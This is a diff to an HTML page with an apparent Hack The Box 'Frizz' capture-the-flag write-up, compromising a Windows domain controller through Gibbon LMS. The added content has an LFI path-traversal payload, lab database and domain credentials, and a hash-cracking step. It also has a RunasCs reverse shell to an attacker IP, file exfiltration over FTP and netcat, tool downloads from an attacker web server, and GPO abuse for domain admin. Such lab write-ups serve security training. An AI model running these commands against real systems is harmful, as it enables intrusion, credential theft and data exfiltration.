@@ -107,6 +107,8 @@
         .code-block pre {
             margin: 0;
             color: var(--primary-color);
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
         
         .copy-btn {
@@ -180,6 +182,39 @@
             box-shadow: 0 0 10px var(--primary-color);
         }
         
+        .note-box {
+            background: rgba(255, 255, 0, 0.1);
+            border: 2px solid #ff0;
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            color: #ff0;
+        }
+        
+        .warning-box {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #f00;
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            color: #f00;
+        }
+        
+        .user-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        
+        .user-item {
+            background: rgba(0, 255, 0, 0.05);
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+        }
+        
         @media (max-width: 768px) {
             .writeup-title {
                 font-size: 2rem;
@@ -195,6 +230,10 @@
             
             .code-block {
                 padding: 1rem;
+            }
+            
+            .user-list {
+                grid-template-columns: 1fr;
             }
         }
     </style>
@@ -266,11 +305,11 @@
                         <tbody>
                             <tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH for Windows 9.5</td></tr>
                             <tr><td>53/tcp</td><td>open</td><td>domain</td><td>Simple DNS Plus</td></tr>
-                            <tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.58</td></tr>
+                            <tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)</td></tr>
                             <tr><td>88/tcp</td><td>open</td><td>kerberos-sec</td><td>Microsoft Windows Kerberos</td></tr>
                             <tr><td>135/tcp</td><td>open</td><td>msrpc</td><td>Microsoft Windows RPC</td></tr>
                             <tr><td>139/tcp</td><td>open</td><td>netbios-ssn</td><td>Microsoft Windows netbios-ssn</td></tr>
-                            <tr><td>389/tcp</td><td>open</td><td>ldap</td><td>Microsoft Windows Active Directory LDAP</td></tr>
+                            <tr><td>389/tcp</td><td>open</td><td>ldap</td><td>Microsoft Windows Active Directory LDAP (Domain: frizz.htb)</td></tr>
                             <tr><td>445/tcp</td><td>open</td><td>microsoft-ds</td><td></td></tr>
                             <tr><td>464/tcp</td><td>open</td><td>kpasswd5</td><td></td></tr>
                             <tr><td>593/tcp</td><td>open</td><td>ncacn_http</td><td>Microsoft Windows RPC over HTTP</td></tr>
@@ -281,20 +320,44 @@
                     </table>
 
                     <h3 class="subsection-title">Web Page Analysis</h3>
-                    <p>The website redirected to <code>http://frizzdc.frizz.htb/home/</code> and was running Gibbon v25.0.00. Investigation revealed:</p>
-                    <ul>
-                        <li>Login form potentially vulnerable to brute-force</li>
-                        <li>LFI vulnerability in the <code>q</code> parameter</li>
-                        <li>CVE-2023-45878 exploit leading to initial access</li>
-                    </ul>
+                    <p>The website redirected to <code>http://frizzdc.frizz.htb/home/</code> and was running <strong>Gibbon v25.0.00</strong>. The main page showed a login form with a notice about migration to Azure AD.</p>
+                    
+                    <div class="note-box">
+                        <strong>Notice Found:</strong> "Due to unplanned Pentesting by students, WES is migrating applications and tools to stronger security protocols. During this transition, Ms. Fiona Frizzle will be migrating Gibbon to utilize our Azure Active Directory SSO. Please note this might take 48 hours where your accounts will not be available."
+                    </div>
+
+                    <h3 class="subsection-title">LFI Vulnerability Discovery</h3>
+                    <p>Discovered Local File Inclusion vulnerability in the <code>q</code> parameter:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre>http://frizzdc.frizz.htb/Gibbon-LMS/?q=../../../etc/passwd</pre>
+                    </div>
+
+                    <p>After research, found <strong>CVE-2023-45878</strong> affecting Gibbon LMS:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># Exploit reference: https://github.com/davidzzo23/CVE-2023-45878
+# NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-45878</pre>
+                    </div>
                 </div>
 
                 <!-- Initial Access Section -->
                 <div class="writeup-section">
                     <h2 class="section-title">Initial Access</h2>
                     
-                    <h3 class="subsection-title">Gibbon LMS Exploitation</h3>
-                    <p>Exploiting CVE-2023-45878 provided initial access as <code>w.webservice</code>:</p>
+                    <h3 class="subsection-title">Exploiting CVE-2023-45878</h3>
+                    <p>Successfully exploited the vulnerability to gain initial access as <code>w.webservice</code>:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># Gained PowerShell session as w.webservice
+PS C:\xampp\htdocs\Gibbon-LMS></pre>
+                    </div>
+
+                    <h3 class="subsection-title">Domain User Enumeration</h3>
+                    <p>Enumerated domain users:</p>
                     
                     <div class="code-block">
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
@@ -312,17 +375,37 @@ v.frizzle    w.li    w.Webservice</pre>
                     </div>
 
                     <h3 class="subsection-title">Database Credentials Extraction</h3>
-                    <p>Found database credentials in configuration files:</p>
+                    <p>Found database credentials in the Gibbon configuration file:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># Database configuration found in config file
+$databaseServer = 'localhost';
+$databaseUsername = 'MrGibbonsDB';
+$databasePassword = 'MisterGibbs!Parrot!?';
+$databaseName = 'gibbon';</pre>
+                    </div>
+
+                    <h3 class="subsection-title">Database Exploration</h3>
+                    <p>Connected to MySQL database and extracted user information:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># MySQL commands executed
+.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?" -e "show databases;"
+.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?" -D gibbon -e "show tables;"
+.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?" -D gibbon -e "select * from gibbonperson;" -E</pre>
+                    </div>
+
+                    <p>Discovered password hash and salt for user <code>f.frizzle</code>:</p>
                     
                     <div class="cred-box">
-                        <div class="cred-item"><strong>Database Server:</strong> localhost</div>
-                        <div class="cred-item"><strong>Username:</strong> MrGibbonsDB</div>
-                        <div class="cred-item"><strong>Password:</strong> MisterGibbs!Parrot!?</div>
-                        <div class="cred-item"><strong>Database:</strong> gibbon</div>
+                        <div class="cred-item"><strong>Hash:</strong> 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03</div>
+                        <div class="cred-item"><strong>Salt:</strong> /aACFhikmNopqrRTVz2489</div>
                     </div>
 
                     <h3 class="subsection-title">Password Cracking</h3>
-                    <p>Extracted and cracked password hash using custom Python script:</p>
+                    <p>Created Python script to crack the salted SHA256 hash:</p>
                     
                     <div class="code-block">
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
@@ -349,19 +432,20 @@ if __name__ == "__main__":
     crack_password()</pre>
                     </div>
 
-                    <p>Discovered credentials: <strong>f.frizzle:Jenni_Luvs_Magic23</strong></p>
-                </div>
-
-                <!-- Privilege Escalation Section -->
-                <div class="writeup-section">
-                    <h2 class="section-title">Privilege Escalation</h2>
+                    <p>Successfully cracked password: <strong>Jenni_Luvs_Magic23</strong></p>
                     
+                    <div class="cred-box">
+                        <div class="cred-item"><strong>Credentials:</strong> f.frizzle:Jenni_Luvs_Magic23</div>
+                    </div>
+
                     <h3 class="subsection-title">Kerberos Ticket Generation</h3>
-                    <p>Generated TGT ticket for f.frizzle:</p>
+                    <p>Generated TGT ticket for f.frizzle using getTGT.py:</p>
                     
                     <div class="code-block">
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-                        <pre>faketime "$(ntpdate -q frizzdc.frizz.htb | cut -d ' ' -f 1,2)" getTGT.py -dc-ip 10.10.11.60 frizz.htb/f.frizzle:Jenni_Luvs_Magic23</pre>
+                        <pre>faketime "$(ntpdate -q frizzdc.frizz.htb | cut -d ' ' -f 1,2)" getTGT.py -dc-ip 10.10.11.60 frizz.htb/f.frizzle:Jenni_Luvs_Magic23
+
+[*] Saving ticket in f.frizzle.ccache</pre>
                     </div>
 
                     <h3 class="subsection-title">SSH Access</h3>
@@ -374,16 +458,79 @@ klist
 ssh f.frizzle@FRIZZ.HTB -K</pre>
                     </div>
 
+                    <p>Successfully accessed the system as <code>f.frizzle</code> and found user flag:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre>PS C:\Users\f.frizzle\Desktop> ls
+
+Directory: C:\Users\f.frizzle\Desktop
+
+Mode    LastWriteTime    Length Name
+--ar--    7/10/2025  4:01 AM    34 user.txt</pre>
+                    </div>
+                </div>
+
+                <!-- Privilege Escalation Section -->
+                <div class="writeup-section">
+                    <h2 class="section-title">Privilege Escalation</h2>
+                    
+                    <h3 class="subsection-title">Recycle Bin Investigation</h3>
+                    <p>Discovered hidden files in Recycle Bin:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre>PS C:\> dir 'C:\$RECYCLE.BIN\S-1-5-21-2386970844-1145388522-2932701813-1103'
+
+Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970844-1145388522-2932701813-1103
+
+Mode    LastWriteTime    Length Name
+--a--    10/29/2024  7:31 AM    148 $IEZXWEG.72
+--a--    10/24/2024  9:16 PM    30410907 $NEZXWEG.72</pre>
+                    </div>
+
+                    <h3 class="subsection-title">File Transfer Setup</h3>
+                    <p>Set up Python FTP server to transfer files:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># Attack machine - Start FTP server
+sudo python3 -m pyftpdlib --port 21 --write
+
+# Target machine - Transfer files
+$ftp = "ftp://10.10.16.6/72_2.72"
+$file = "C:\Users\f.frizzle\Desktop\recovered2.72"
+$client = New-Object System.Net.WebClient
+$client.UploadFile($ftp, $file)</pre>
+                    </div>
+
                     <h3 class="subsection-title">WAPT Configuration Analysis</h3>
-                    <p>Discovered WAPT (Windows Application Package Toolkit) configuration files containing credentials:</p>
+                    <p>Discovered WAPT (Windows Application Package Toolkit) configuration containing credentials:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># Found in wapt/conf/waptserver.ini
+!suBcig@MehTed!R</pre>
+                    </div>
+
+                    <p>Tested credentials against domain users and found match for <code>M.SchoolBus</code>:</p>
                     
                     <div class="cred-box">
-                        <div class="cred-item"><strong>Password Found:</strong> !suBcig@MehTed!R</div>
-                        <div class="cred-item"><strong>User:</strong> M.SchoolBus</div>
+                        <div class="cred-item"><strong>Credentials:</strong> M.SchoolBus:!suBcig@MehTed!R</div>
+                    </div>
+
+                    <h3 class="subsection-title">Kerberos Ticket for M.SchoolBus</h3>
+                    <p>Generated TGT for the new user:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre>faketime "$(ntpdate -q frizzdc.frizz.htb | cut -d ' ' -f 1,2)" getTGT.py -dc-ip 10.10.11.60 frizz.htb/M.SchoolBus:'!suBcig@MehTed!R'
+export KRB5CCNAME=M.SchoolBus.ccache
+klist</pre>
                     </div>
 
                     <h3 class="subsection-title">BloodHound Enumeration</h3>
-                    <p>Used BloodHound to discover attack paths:</p>
+                    <p>Ran BloodHound to discover attack paths:</p>
                     
                     <div class="code-block">
                         <button class="copy-btn" onclick="copyCode(this)">Copy</button>
@@ -400,11 +547,54 @@ ssh f.frizzle@FRIZZ.HTB -K</pre>
                         <pre># Create evil GPO
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"
 
-# Add local admin
+# Add local admin using SharpGPOAbuse
 SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Administrator --GPOName "Evil GPO"
 
 # Force GPO update
 gpupdate /force</pre>
+                    </div>
+
+                    <div class="note-box">
+                        <strong>GPO Abuse Technique:</strong> The ability to alter the gPLink attribute allowed applying a malicious GPO to all child user and computer objects, enabling arbitrary command execution through immediate scheduled tasks.
+                    </div>
+
+                    <h3 class="subsection-title">Reverse Shell Setup</h3>
+                    <p>Set up reverse shell using RunasCs.exe:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># Running Rubeus.exe as M.SchoolBus
+.\RunasCs.exe M.SchoolBus !suBcig@MehTed!R powershell.exe -r 10.10.16.6:4444</pre>
+                    </div>
+
+                    <h3 class="subsection-title">Tool Transfer</h3>
+                    <p>Transferred necessary tools to target machine:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># Attack host
+cd ~/www
+python3 -m http.server 1111
+
+# Target machine
+Invoke-WebRequest -Uri http://10.10.16.56:1111/nc.exe -OutFile 'C:\Temp\nc.exe'
+Invoke-WebRequest -Uri http://10.10.16.56:1111/SharpHound.exe -OutFile 'C:\Temp\SharpHound.exe'</pre>
+                    </div>
+
+                    <h3 class="subsection-title">SharpHound Execution</h3>
+                    <p>Ran SharpHound for comprehensive AD enumeration:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># Running SharpHound
+.\SharpHound.exe -c All --zipfilename FRIZZ
+
+# Transferring results to attack machine
+# Target Machine
+nc.exe 10.10.16.56 1111 < 20250710181602_FRIZZ.zip
+
+# Attack Machine
+nc -nlvp 1111 > frizz.zip</pre>
                     </div>
                 </div>
 
@@ -430,23 +620,65 @@ gpupdate /force</pre>
                     <div class="timeline">
                         <div class="timeline-item">
                             <h4 class="subsection-title">Phase 1: Enumeration</h4>
-                            <p>Nmap scan → Web application analysis → LFI discovery → CVE-2023-45878 exploitation</p>
+                            <p>Nmap scan → Web application analysis → LFI discovery → CVE-2023-45878 research</p>
                         </div>
                         
                         <div class="timeline-item">
                             <h4 class="subsection-title">Phase 2: Initial Access</h4>
-                            <p>Database credentials extraction → Password cracking → Kerberos ticket generation → SSH access</p>
+                            <p>CVE-2023-45878 exploitation → Database credentials extraction → Password cracking → Kerberos ticket generation → SSH access</p>
                         </div>
                         
                         <div class="timeline-item">
-                            <h4 class="subsection-title">Phase 3: Privilege Escalation</h4>
-                            <p>WAPT configuration analysis → BloodHound enumeration → GPO abuse → Domain admin access</p>
+                            <h4 class="subsection-title">Phase 3: Post-Exploitation</h4>
+                            <p>Recycle bin analysis → WAPT configuration discovery → Credential testing → BloodHound enumeration</p>
                         </div>
                         
                         <div class="timeline-item">
-                            <h4 class="subsection-title">Phase 4: Exfiltration</h4>
+                            <h4 class="subsection-title">Phase 4: Privilege Escalation</h4>
+                            <p>GPO abuse → Administrative access → Tool transfer → Data exfiltration</p>
+                        </div>
+                        
+                        <div class="timeline-item">
+                            <h4 class="subsection-title">Phase 5: Exfiltration</h4>
                             <p>Flag capture → Proof collection</p>
                         </div>
+                    </div>
+                </div>
+
+                <!-- Tools Section -->
+                <div class="writeup-section">
+                    <h2 class="section-title">Tools Used</h2>
+                    
+                    <div class="user-list">
+                        <div class="user-item">Nmap</div>
+                        <div class="user-item">getTGT.py</div>
+                        <div class="user-item">BloodHound</div>
+                        <div class="user-item">SharpGPOAbuse</div>
+                        <div class="user-item">RunasCs.exe</div>
+                        <div class="user-item">SharpHound.exe</div>
+                        <div class="user-item">Netcat (nc.exe)</div>
+                        <div class="user-item">Python FTP Server</div>
+                    </div>
+                </div>
+
+                <!-- References Section -->
+                <div class="writeup-section">
+                    <h2 class="section-title">References</h2>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># CVE References
+- CVE-2023-45878: https://nvd.nist.gov/vuln/detail/CVE-2023-45878
+- Exploit Code: https://github.com/davidzzo23/CVE-2023-45878
+
+# GPO Abuse References
+- https://wald0.com/?p=179
+- https://redfoxsec.com/blog/gpo-abuse/
+
+# Tools
+- BloodHound: https://github.com/BloodHoundAD/BloodHound
+- SharpGPOAbuse: https://github.com/FSecureLABS/SharpGPOAbuse
+- getTGT.py: Part of Impacket toolkit</pre>
                     </div>
                 </div>
             </div>
